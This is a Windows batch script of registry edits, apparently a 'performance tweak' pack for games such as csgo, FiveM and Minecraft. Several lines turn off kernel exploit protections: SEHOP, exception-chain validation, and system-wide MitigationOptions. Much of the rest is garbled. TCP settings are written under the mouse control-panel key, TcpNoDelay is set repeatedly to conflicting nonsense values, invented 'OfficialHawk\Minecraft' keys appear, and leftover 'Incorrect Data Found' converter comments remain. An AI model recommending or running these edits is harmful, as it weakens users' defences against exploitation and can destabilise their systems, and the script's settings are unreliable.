Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csgo.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageTarget" /t REG_DWORD /d "0" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemCacheDirtyPageThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageThreshold" /t REG_DWORD /d "250" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcTotalDirtyPages" /t REG_DWORD /d "0" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageTarget" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemCacheDirtyPageThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageThreshold" /t REG_DWORD /d "500" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcTotalDirtyPages" /t REG_DWORD /d "0" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageTarget" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerinterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "ObUnsecureGlobalNames" /t REG_MULTI_SZ /d "netfxcustomperfcounters.1.0\0SharedPerfIPCBlock\0Cor_Private_IPCBlock\0Cor_Public_IPCBlock_" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "SeTokenSingletonAttributesConfig" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "obcaseinsensitive" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationAuditOptions" /t REG_BINARY /d "222222222222222222222222222222222222222222222222" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationOptions" /t REG_BINARY /d "222222222222222222222222222222222222222222222222" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableTsx" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MinimumDpcRate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DpcQueueDepth" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "ThreadDpcEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "SplitLargeCaches" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DpcWatchdogProfileOffset" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DpcTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DpcWatchdogPeriod" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MaximumDpcQueueDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "AdjustDpcThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "IdealDpcRate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\usbflags" /v "fid_D1Latency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\usbflags" /v "fid_D2Latency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\usbflags" /v "fid_D3Latency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0000" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0001" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0002" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0003" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0004" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0005" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0006" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0007" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0008" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0009" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0010" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0011" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0012" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0013" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0014" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0015" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0016" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0017" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0018" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0019" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0020" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0021" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0022" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0023" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0024" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0025" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0026" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0027" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0028" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0029" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0030" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0031" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Class\USB\0032" /v "IdleEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csgo.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
:: ---------------------------------------------------  !!! Incorrect Data Found !!!  -------------------------------------------------------------
:: HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectX\UserGpuPreferences --> MadeBy*techiesavi
:: ------------------------------------------------------------------------------------------------------------------------------------------------

Reg.exe add "HKCU\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Discord.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FiveM.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FiveM_GTAProcess.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Print" /v "PortThreadPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Print" /v "PriorityClass" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "InitialKeyboardIndicators" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardSpeed" /t REG_SZ /d "100" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "ActiveWindowTracking" /t REG_DWORD /d "1000" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "Beep" /t REG_SZ /d "No" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickHeight" /t REG_SZ /d "16" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickSpeed" /t REG_SZ /d "0,5" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickWidth" /t REG_SZ /d "16" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "ExtendedSounds" /t REG_SZ /d "No" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverHeight" /t REG_SZ /d "16" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "300" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverWidth" /t REG_SZ /d "22" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseTrails" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SmoothMouseXCurve" /t REG_BINARY /d "0000000000000000703d0a0000000000e07a14000000000050b81e0000000000c0f5280000000000" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SmoothMouseYCurve" /t REG_BINARY /d "0000000000000000000038000000000000007000000000000000a800000000000000e00000000000" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SnapToDefaultButton" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SwapMouseButtons" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "TCPDelAckTicks" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "Tcp1323Opts" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickHeight2" /t REG_SZ /d "0,5" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickSpeed2" /t REG_SZ /d "0,5" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickWidth2" /t REG_SZ /d "40" /f
:: ---------------------------------------------------  !!! Incorrect Data Found !!!  -------------------------------------------------------------
:: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters --> TcpTimedWaitDelay" dword:30
:: HKEY_LOCAL_MACHINE\SYSTEM\Microsoft/Windows/CurrentVersion/Internet Settings --> MaxConnectionsPerServer" =dword:00000010
:: HKEY_LOCAL_MACHINE\SYSTEM\Microsoft/Windows/CurrentVersion/Internet Settings --> MaxConnectionsPer1_0Server" =dword:00000010
:: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip/Tcpip/QoS --> Do not use NLA ="1"
:: ------------------------------------------------------------------------------------------------------------------------------------------------

Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\Microsoft/Windows/CurrentVersion/Internet Settings" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip/Tcpip/QoS" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.7.10" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\USER\AppData\Roaming\.minecraft\versions\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TcpAckFrequency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MTU" /t REG_DWORD /d "5207" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MSS" /t REG_DWORD /d "1337" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IRPStackSize" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "95268" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.9.4" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\Users\Owner\AppData\Roaming\.minecraft\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxFreeTcbs" /t REG_DWORD /d "415030" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "95520" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultRCVWindow" /t REG_DWORD /d "94258" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPerServer" /t REG_DWORD /d "22" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "22" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.9.4" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\Users\Owner\AppData\Roaming\.minecraft\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxFreeTcbs" /t REG_DWORD /d "415030" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "415029" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultRCVWindow" /t REG_DWORD /d "94258" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPerServer" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DnsPriority" /t REG_DWORD /d "1469" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "HostsPriority" /t REG_DWORD /d "572" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "LocalPriority" /t REG_DWORD /d "91" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NetbtPriority" /t REG_DWORD /d "45" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "QualifyingDestinationThreshold" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IPEnableRouter" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveTime" /t REG_DWORD /d "7200000" /f
